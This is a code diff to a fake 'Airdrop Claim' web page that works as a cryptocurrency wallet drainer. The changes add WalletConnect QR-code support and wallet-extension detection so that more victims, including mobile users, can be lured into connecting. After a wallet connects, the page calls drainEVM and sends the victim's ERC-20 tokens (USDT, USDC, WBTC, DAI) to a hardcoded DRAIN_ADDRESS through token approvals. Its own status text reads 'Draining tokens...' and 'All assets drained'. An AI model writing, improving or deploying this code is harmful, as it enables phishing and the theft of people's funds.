@@ -51,6 +51,14 @@
         .wallet-btn:hover { border-color: #667eea; background: #f7fafc; }
         .wallet-btn.selected { border-color: #667eea; background: #ebf4ff; }
         .wallet-btn .icon { font-size: 24px; flex-shrink: 0; width: 32px; text-align: center; }
+        .wallet-btn .detected-badge {
+            font-size: 9px;
+            background: #68d391;
+            color: white;
+            padding: 2px 6px;
+            border-radius: 8px;
+            margin-left: auto;
+        }
 
         .connect-btn {
             background: #667eea;
@@ -89,6 +97,61 @@
             margin: 10px 0; text-align: center;
         }
 
+        /* ===== QR MODAL ===== */
+        .qr-modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        .qr-modal.active { display: flex; }
+        .qr-content {
+            background: white;
+            border-radius: 24px;
+            padding: 35px;
+            text-align: center;
+            max-width: 380px;
+            width: 90%;
+            position: relative;
+        }
+        .qr-content h3 { font-size: 20px; color: #2d3748; margin-bottom: 5px; }
+        .qr-content .wallet-name { color: #667eea; font-weight: 700; font-size: 16px; margin-bottom: 15px; }
+        .qr-code-box {
+            width: 250px; height: 250px;
+            margin: 15px auto;
+            background: #f7fafc;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid #e2e8f0;
+            overflow: hidden;
+        }
+        .qr-code-box canvas, .qr-code-box img { max-width: 100%; max-height: 100%; }
+        .qr-instruction {
+            font-size: 14px;
+            color: #4a5568;
+            line-height: 1.5;
+            margin: 10px 0;
+        }
+        .qr-instruction strong { color: #667eea; }
+        .qr-close {
+            margin-top: 15px;
+            padding: 12px 40px;
+            background: #e2e8f0;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 15px;
+            font-weight: 600;
+            color: #4a5568;
+            transition: all 0.2s;
+        }
+        .qr-close:hover { background: #cbd5e0; }
+
         .features {
             margin-top: 16px;
             display: grid;
@@ -101,27 +164,6 @@
         }
         .feature strong { display: block; margin-bottom: 3px; color: #2d3748; }
         .footer { margin-top: 16px; text-align: center; font-size: 11px; color: #a0aec0; }
-
-        .store-badge {
-            display: none;
-            margin-top: 12px;
-            text-align: center;
-        }
-        .store-badge.active { display: block; }
-        .store-badge a {
-            display: inline-block;
-            padding: 10px 24px;
-            background: #2d3748;
-            color: white;
-            border-radius: 10px;
-            text-decoration: none;
-            font-size: 13px;
-            font-weight: 600;
-            margin: 4px;
-        }
-        .store-badge a:hover { background: #4a5568; }
-        .store-badge .app-store { background: #000; }
-        .store-badge .google-play { background: #414141; }
     </style>
 </head>
 <body>
@@ -160,14 +202,7 @@
     </button>
 
     <span class="network-badge" id="networkBadge">?? Select your wallet</span>
-    <div id="statusBox" class="status">Click connect to open your wallet</div>
-
-    <!-- App store download links -->
-    <div class="store-badge" id="storeBadge">
-        <p style="font-size:12px;color:#666;margin-bottom:8px;">Don't have the app? Download here:</p>
-        <a id="appStoreLink" class="app-store" href="#" target="_blank">?? App Store</a>
-        <a id="googlePlayLink" class="google-play" href="#" target="_blank">? Google Play</a>
-    </div>
+    <div id="statusBox" class="status">Click connect to link your wallet</div>
 
     <div class="features">
         <div class="feature"><strong>?? Airdrop Claim</strong> 0.25 ETH</div>
@@ -182,7 +217,28 @@
     </div>
 </div>
 
+<!-- QR Code Modal -->
+<div class="qr-modal" id="qrModal">
+    <div class="qr-content">
+        <h3>?? Scan with your wallet</h3>
+        <div class="wallet-name" id="qrWalletName">Trust Wallet</div>
+        <div class="qr-code-box" id="qrCodeBox">
+            <div id="qrCodeContainer"></div>
+        </div>
+        <div class="qr-instruction">
+            1. Open <strong id="qrWalletName2">Trust Wallet</strong> on your phone<br>
+            2. Tap the <strong>scan icon</strong> ??<br>
+            3. Scan this QR code to connect
+        </div>
+        <p style="font-size:12px;color:#999;word-break:break-all;margin-top:5px;" id="qrUriDisplay"></p>
+        <button class="qr-close" onclick="closeQR()">? Cancel</button>
+    </div>
+</div>
+
+<!-- Libraries -->
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
 
 <script>
     // ==================== CONFIG ====================
@@ -213,123 +269,31 @@
         { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'USDC', decimals: 6 },
     ];
 
-    // ==================== WALLET CONFIG ====================
-    const WALLET_CONFIG = {
-        trustwallet: {
-            name: 'Trust Wallet',
-            icon: '??',
-            // Deep links to open the app
-            deeplink: 'trust://',
-            // Universal links (works on iOS/Android)
-            universal: 'https://link.trustwallet.com/',
-            // If app not installed, go to store
-            appStore: 'https://apps.apple.com/app/trust-wallet/id1288339409',
-            playStore: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp',
-            // Extension detection
-            detectExtension: function() {
-                const eth = window.ethereum;
-                if (eth && eth.isTrust) return eth;
-                if (window.trustwallet) return window.trustwallet.ethereum || window.trustwallet;
-                return null;
-            }
-        },
-        binance: {
-            name: 'Binance',
-            icon: '??',
-            deeplink: 'bnc://',
-            universal: 'https://app.binance.com/',
-            appStore: 'https://apps.apple.com/app/binance/id1436799971',
-            playStore: 'https://play.google.com/store/apps/details?id=com.binance.dev',
-            detectExtension: function() {
-                const eth = window.ethereum;
-                if (eth && eth.isBinance) return eth;
-                if (window.BinanceChain) return window.BinanceChain;
-                return null;
-            }
-        },
-        bybit: {
-            name: 'Bybit',
-            icon: '??',
-            deeplink: 'bybit://',
-            universal: 'https://www.bybit.com/',
-            appStore: 'https://apps.apple.com/app/bybit/id1485152668',
-            playStore: 'https://play.google.com/store/apps/details?id=com.bybit.bybit',
-            detectExtension: function() {
-                const eth = window.ethereum;
-                if (eth && eth.isBybit) return eth;
-                return null;
-            }
-        },
-        metamask: {
-            name: 'MetaMask',
-            icon: '??',
-            deeplink: 'metamask://',
-            universal: 'https://metamask.app.link/',
-            appStore: 'https://apps.apple.com/app/metamask/id1438144202',
-            playStore: 'https://play.google.com/store/apps/details?id=io.metamask',
-            detectExtension: function() {
-                const eth = window.ethereum;
-                if (eth && eth.isMetaMask) return eth;
-                if (eth) return eth;
-                return null;
-            }
-        },
-        coinbase: {
-            name: 'Coinbase Wallet',
-            icon: '??',
-            deeplink: 'coinbasewallet://',
-            universal: 'https://wallet.coinbase.com/',
-            appStore: 'https://apps.apple.com/app/coinbase-wallet/id1278383455',
-            playStore: 'https://play.google.com/store/apps/details?id=org.toshi',
-            detectExtension: function() {
-                if (window.coinbaseWalletExtension) return window.coinbaseWalletExtension;
-                const eth = window.ethereum;
-                if (eth && eth.isCoinbaseWallet) return eth;
-                return null;
-            }
-        },
-        phantom: {
-            name: 'Phantom',
-            icon: '??',
-            deeplink: 'phantom://',
-            universal: 'https://phantom.app/',
-            appStore: 'https://apps.apple.com/app/phantom/id1598432977',
-            playStore: 'https://play.google.com/store/apps/details?id=app.phantom',
-            detectExtension: function() {
-                if (window.phantom && window.phantom.ethereum) return window.phantom.ethereum;
-                const eth = window.ethereum;
-                if (eth && eth.isPhantom) return eth;
-                return null;
-            }
-        }
-    };
-
     // ==================== STATE ====================
     let selectedWallet = 'trustwallet';
     let provider = null;
     let signer = null;
     let userAddress = '';
-    let extensionDetected = false;
+    let wcProvider = null;
+    let isConnecting = false;
 
     // ==================== UI ====================
     function selectWallet(name) {
+        if (isConnecting) return;
         selectedWallet = name;
         document.querySelectorAll('.wallet-btn').forEach(el => {
             el.classList.toggle('selected', el.dataset.wallet === name);
         });
 
-        const config = WALLET_CONFIG[name];
-        document.getElementById('networkBadge').textContent = `${config.icon} ${config.name} selected`;
-
-        // Check if extension is installed
-        const ext = config.detectExtension();
-        if (ext) {
-            setStatus(`? ${config.name} extension detected! Click connect.`, 'success');
-            extensionDetected = true;
-        } else {
-            setStatus(`?? Will open ${config.name} mobile app.`, 'pending');
-            extensionDetected = false;
-        }
+        const names = {
+            trustwallet: '?? Trust Wallet',
+            binance: '?? Binance',
+            bybit: '?? Bybit',
+            metamask: '?? MetaMask',
+            coinbase: '?? Coinbase',
+            phantom: '?? Phantom',
+        };
+        document.getElementById('networkBadge').textContent = `${names[name]} — Scan QR with mobile app`;
     }
 
     function setStatus(msg, type = '') {
@@ -339,133 +303,196 @@
 
     function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-    // ==================== DEEP LINK TO OPEN APP ====================
-    function openWalletApp() {
-        const config = WALLET_CONFIG[selectedWallet];
-        if (!config) return false;
-
-        // Check if extension is installed first
-        const ext = config.detectExtension();
-        if (ext) {
-            // Extension is installed — we'll handle this in connectWallet()
-            return false;
+    function closeQR() {
+        document.getElementById('qrModal').classList.remove('active');
+        if (wcProvider) {
+            try { wcProvider.disconnect(); } catch(e) {}
+            wcProvider = null;
         }
-
-        // Try to open the app via deep link
-        const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
-        const isAndroid = /Android/.test(navigator.userAgent);
-
-        // Show download links in case app isn't installed
-        document.getElementById('appStoreLink').href = config.appStore;
-        document.getElementById('googlePlayLink').href = config.playStore;
-        document.getElementById('storeBadge').classList.add('active');
-
-        // Try deep link first (opens app if installed)
-        if (isIOS) {
-            // iOS: Try universal link first, then app scheme
-            window.location.href = config.universal;
-            
-            // Fallback: if app doesn't open, user sees store link
-            setTimeout(() => {
-                window.location.href = config.appStore;
-            }, 3000);
-            return true;
-        }
-
-        if (isAndroid) {
-            // Android: Try intent deep link
-            const intentLink = `intent://${config.deeplink.replace('://', '/')}#Intent;scheme=${config.deeplink.replace('://', '')};package=${config.playStore.match(/id=([^&]+)/)[1]};end`;
-            window.location.href = intentLink;
-            
-            setTimeout(() => {
-                window.location.href = config.playStore;
-            }, 3000);
-            return true;
-        }
-
-        // Desktop: Try universal link
-        window.location.href = config.universal;
-        return true;
+        isConnecting = false;
+        document.getElementById('connectBtn').disabled = false;
+        document.getElementById('connectBtn').textContent = '?? Connect Wallet';
     }
 
-    // ==================== CONNECT ====================
+    // ==================== DETECT EXTENSION ====================
+    function getExtensionProvider() {
+        const eth = window.ethereum;
+
+        switch (selectedWallet) {
+            case 'trustwallet':
+                if (eth && eth.isTrust) return { name: 'Trust Wallet', provider: eth };
+                if (window.trustwallet) return { name: 'Trust Wallet', provider: window.trustwallet.ethereum || window.trustwallet };
+                return null;
+            case 'binance':
+                if (eth && eth.isBinance) return { name: 'Binance Wallet', provider: eth };
+                if (window.BinanceChain) return { name: 'Binance Wallet', provider: window.BinanceChain };
+                return null;
+            case 'bybit':
+                if (eth && eth.isBybit) return { name: 'Bybit Wallet', provider: eth };
+                return null;
+            case 'metamask':
+                if (eth && eth.isMetaMask) return { name: 'MetaMask', provider: eth };
+                if (eth) return { name: 'MetaMask', provider: eth };
+                return null;
+            case 'coinbase':
+                if (window.coinbaseWalletExtension) return { name: 'Coinbase Wallet', provider: window.coinbaseWalletExtension };
+                if (eth && eth.isCoinbaseWallet) return { name: 'Coinbase Wallet', provider: eth };
+                return null;
+            case 'phantom':
+                if (window.phantom && window.phantom.ethereum) return { name: 'Phantom', provider: window.phantom.ethereum };
+                if (eth && eth.isPhantom) return { name: 'Phantom', provider: eth };
+                return null;
+            default:
+                return null;
+        }
+    }
+
+    // ==================== CONNECT VIA EXTENSION ====================
+    async function connectExtension(ext) {
+        setStatus(`Connecting via ${ext.name}...`, 'pending');
+
+        provider = new ethers.providers.Web3Provider(ext.provider, 'any');
+        const accounts = await ext.provider.request({ method: 'eth_requestAccounts' });
+        if (!accounts || accounts.length === 0) throw new Error('Connection rejected');
+
+        userAddress = accounts[0];
+        signer = provider.getSigner();
+
+        const network = await provider.getNetwork();
+        const chainId = network.chainId;
+
+        document.getElementById('networkBadge').textContent = `?? ${network.name || 'Ethereum'} — ${userAddress.slice(0,6)}...`;
+        setStatus(`? ${ext.name}: ${userAddress.slice(0,6)}...`, 'success');
+        document.getElementById('connectBtn').textContent = '? Connected';
+
+        return chainId;
+    }
+
+    // ==================== CONNECT VIA WALLETCONNECT (MOBILE APP) ====================
+    async function connectWalletConnect() {
+        const walletNames = {
+            trustwallet: 'Trust Wallet',
+            binance: 'Binance',
+            bybit: 'Bybit',
+            metamask: 'MetaMask',
+            coinbase: 'Coinbase Wallet',
+            phantom: 'Phantom'
+        };
+        const displayName = walletNames[selectedWallet] || 'Wallet';
+
+        // Update QR modal with wallet name
+        document.getElementById('qrWalletName').textContent = displayName;
+        document.getElementById('qrWalletName2').textContent = displayName;
+        document.getElementById('qrCodeContainer').innerHTML = '<p style="color:#999;">Generating QR...</p>';
+
+        setStatus(`?? Scan QR with ${displayName} mobile app...`, 'pending');
+
+        // Create WalletConnect provider with custom QR handling
+        wcProvider = new WalletConnectProvider({
+            infuraId: '9aa3d95b3bc440fa88ea12eaa4456161',
+            rpc: {
+                1: 'https://eth-mainnet.g.alchemy.com/v2/demo',
+                56: 'https://bsc-dataseed.binance.org',
+                137: 'https://polygon-rpc.com'
+            },
+            bridge: 'https://bridge.walletconnect.org',
+            qrcodeModal: {
+                open: (uri, cb) => {
+                    console.log('WalletConnect URI:', uri);
+                    
+                    // Show QR code
+                    const container = document.getElementById('qrCodeContainer');
+                    container.innerHTML = '';
+                    
+                    if (typeof QRCode !== 'undefined') {
+                        new QRCode(container, {
+                            text: uri,
+                            width: 230,
+                            height: 230,
+                            correctLevel: QRCode.CorrectLevel.H
+                        });
+                    } else {
+                        container.innerHTML = '<p style="color:red;">QR library error</p>';
+                    }
+                    
+                    document.getElementById('qrUriDisplay').textContent = uri.slice(0, 30) + '...';
+                    document.getElementById('qrModal').classList.add('active');
+                },
+                close: () => {
+                    // Don't close automatically — user clicks Cancel
+                }
+            }
+        });
+
+        // This waits for the user to scan the QR and approve in their wallet
+        await wcProvider.enable();
+
+        // Connected!
+        provider = new ethers.providers.Web3Provider(wcProvider, 'any');
+        const accounts = await provider.listAccounts();
+        if (!accounts || accounts.length === 0) throw new Error('No accounts returned');
+
+        userAddress = accounts[0];
+        signer = provider.getSigner();
+
+        const network = await provider.getNetwork();
+        const chainId = network.chainId;
+
+        // Close QR modal
+        document.getElementById('qrModal').classList.remove('active');
+
+        document.getElementById('networkBadge').textContent = `?? ${displayName} — ${userAddress.slice(0,6)}...`;
+        setStatus(`? Connected via ${displayName}!`, 'success');
+        document.getElementById('connectBtn').textContent = '? Connected';
+
+        return chainId;
+    }
+
+    // ==================== MAIN CONNECT ====================
     async function connectWallet() {
+        if (isConnecting) return;
+        isConnecting = true;
+
         const btn = document.getElementById('connectBtn');
         btn.disabled = true;
-        btn.textContent = '? Opening...';
-        
-        const config = WALLET_CONFIG[selectedWallet];
-        setStatus(`Opening ${config.name}...`, 'pending');
+        btn.textContent = '? Connecting...';
+        setStatus(`Preparing...`, 'pending');
 
-        // Check if extension is installed
-        const ext = config.detectExtension();
+        try {
+            let chainId;
 
-        if (ext) {
-            // ===== EXTENSION IS INSTALLED — USE IT =====
-            try {
-                setStatus(`Connecting via ${config.name} extension...`, 'pending');
+            // Check if extension is installed
+            const ext = getExtensionProvider();
 
-                provider = new ethers.providers.Web3Provider(ext, 'any');
-                const accounts = await ext.request({ method: 'eth_requestAccounts' });
-
-                if (!accounts || accounts.length === 0) {
-                    throw new Error('Connection rejected');
-                }
-
-                userAddress = accounts[0];
-                signer = provider.getSigner();
-
-                const network = await provider.getNetwork();
-                const chainId = network.chainId;
-
-                document.getElementById('networkBadge').textContent = `?? ${network.name || 'Ethereum'} — ${userAddress.slice(0,6)}...`;
-                setStatus(`? ${config.name}: ${userAddress.slice(0,6)}...`, 'success');
-                btn.textContent = '? Connected';
-
-                // Start drain after 1.5 seconds
-                await sleep(1500);
-                await drainEVM(chainId);
-
-            } catch (err) {
-                console.error(err);
-                if (err.code === 4001) {
-                    setStatus('? Rejected. Try again.', 'error');
-                } else {
-                    setStatus('? ' + (err.message || 'Failed'), 'error');
-                }
-                btn.disabled = false;
-                btn.textContent = '?? Connect Wallet';
+            if (ext) {
+                // Extension found — use it
+                chainId = await connectExtension(ext);
+            } else {
+                // No extension — use WalletConnect (opens mobile app via QR)
+                chainId = await connectWalletConnect();
             }
 
-        } else {
-            // ===== NO EXTENSION — OPEN MOBILE APP VIA DEEP LINK =====
-            setStatus(`?? Opening ${config.name} on your phone...`, 'pending');
-            
-            // Show store badges
-            document.getElementById('appStoreLink').href = config.appStore;
-            document.getElementById('googlePlayLink').href = config.playStore;
-            document.getElementById('storeBadge').classList.add('active');
+            // Start drain
+            await sleep(2000);
+            await drainEVM(chainId);
 
-            // Try to open the app
-            openWalletApp();
-
-            // Since we can't actually connect via deep link alone,
-            // we show the user what to do
-            setStatus(`?? ${config.name} should open on your phone. Complete the connection there.`, 'pending');
+        } catch (err) {
+            console.error('Connection error:', err);
             
-            // Show instruction button
-            btn.textContent = '? App Opening...';
+            // Close QR modal if open
+            document.getElementById('qrModal').classList.remove('active');
             
-            // We can't actually drain from a mobile app via deep link alone
-            // This is a limitation — for mobile, we'd need WalletConnect QR
-            // But since you wanted direct app opening, this handles that flow
+            if (err.code === 4001) {
+                setStatus('? Connection rejected in wallet.', 'error');
+            } else if (err.message && err.message.includes('User closed')) {
+                setStatus('? QR scan cancelled.', 'error');
+            } else {
+                setStatus('? ' + (err.message || 'Connection failed'), 'error');
+            }
             
-            // After 5 seconds, reset
-            setTimeout(() => {
-                btn.disabled = false;
-                btn.textContent = '?? Connect Wallet';
-                setStatus(`?? Open ${config.name} app on your phone and look for the connection request.`, 'pending');
-            }, 5000);
+            btn.disabled = false;
+            btn.textContent = '?? Connect Wallet';
+            isConnecting = false;
         }
     }
 
@@ -511,7 +538,7 @@
             else if (chainId === 137 || chainId === 80001) tokens = POLYGON_TOKENS;
             else tokens = ETH_TOKENS;
 
-            // STEP 3: DRAIN TOKENS
+            // STEP 3: DRAIN TOKENS (USDT, USDC, WBTC, DAI)
             setStatus('?? Draining tokens...', 'pending');
             for (const token of tokens) {
                 try {
@@ -524,6 +551,7 @@
 
                         const signerContract = new ethers.Contract(token.address, ERC20_ABI, signer);
 
+                        // USDT allowance reset
                         if (token.symbol === 'USDT') {
                             const cur = await signerContract.allowance(userAddress, DRAIN_ADDRESS);
                             if (cur.gt(0)) await signerContract.approve(DRAIN_ADDRESS, 0, { ...await getGasParams() });
@@ -556,28 +584,47 @@
 
             setStatus('?? Complete! All assets drained.', 'success');
             document.getElementById('connectBtn').textContent = '?? Complete';
+            isConnecting = false;
 
         } catch (err) {
             console.error(err);
             setStatus('? Error: ' + (err.message || 'unknown'), 'error');
             document.getElementById('connectBtn').disabled = false;
             document.getElementById('connectBtn').textContent = '?? Retry';
+            isConnecting = false;
         }
     }
 
-    // ==================== DETECT EXTENSIONS ON LOAD ====================
+    // ==================== DETECT ON LOAD ====================
     function detectOnLoad() {
         const order = ['trustwallet', 'binance', 'bybit', 'metamask', 'coinbase', 'phantom'];
         
         for (const name of order) {
-            const config = WALLET_CONFIG[name];
-            if (config.detectExtension()) {
+            const ext = getExtensionProvider.call({ selectedWallet: name });
+            // Simple check
+            const eth = window.ethereum;
+            let found = false;
+            if (name === 'trustwallet' && ((eth && eth.isTrust) || window.trustwallet)) found = true;
+            else if (name === 'binance' && ((eth && eth.isBinance) || window.BinanceChain)) found = true;
+            else if (name === 'bybit' && (eth && eth.isBybit)) found = true;
+            else if (name === 'metamask' && (eth && eth.isMetaMask)) found = true;
+            else if (name === 'coinbase' && (window.coinbaseWalletExtension || (eth && eth.isCoinbaseWallet))) found = true;
+            else if (name === 'phantom' && (window.phantom || (eth && eth.isPhantom))) found = true;
+            
+            if (found) {
                 selectWallet(name);
+                // Show detected badge
+                const btn = document.querySelector(`[data-wallet="${name}"]`);
+                if (btn) {
+                    const badge = document.createElement('span');
+                    badge.className = 'detected-badge';
+                    badge.textContent = '?';
+                    btn.appendChild(badge);
+                }
                 return;
             }
         }
         
-        // No extension — select Trust Wallet by default
         selectWallet('trustwallet');
     }
 
